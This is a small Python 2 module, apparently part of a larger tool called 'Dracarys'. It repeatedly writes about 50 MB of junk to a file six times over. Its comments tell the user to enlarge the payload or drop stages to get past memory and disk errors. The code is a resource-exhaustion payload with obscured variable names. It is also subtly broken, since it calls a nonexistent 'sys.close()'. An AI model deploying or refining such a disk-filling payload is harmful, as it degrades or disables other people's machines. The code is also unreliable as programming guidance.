'''
Not recommended for slow systems :) (ex: mine) :))))
include: main.py 

'''
import sys


def _0x3_buff(size):
	if size:
		_0x3_F = open('Dracarys.0x3', 'w')
		_0X3_B = '\x20\x21'+'0x3'*0x1000
		_0x3_Jump = _0X3_B*0x1000 #change b_JUMP size base on your memory 
		try:
			_0x3_F.write(_0x3_Jump) #stage 1: for bypass memory error 
			_0x3_F.write(_0x3_Jump)	#stage 2: if you got memory error just inscare b_JUMP size
			_0x3_F.write(_0x3_Jump) #stage 3: if you got disk error remove one of stages
			_0x3_F.write(_0x3_Jump) #stage 4: also you can inscare size
			_0x3_F.write(_0x3_Jump) #stage 5: pass
			_0x3_F.write(_0x3_Jump) #stage 6: pass
			_0x3_F.close()
		except Exception as _0x3_err:
			print _0x3_err
			sys.close()



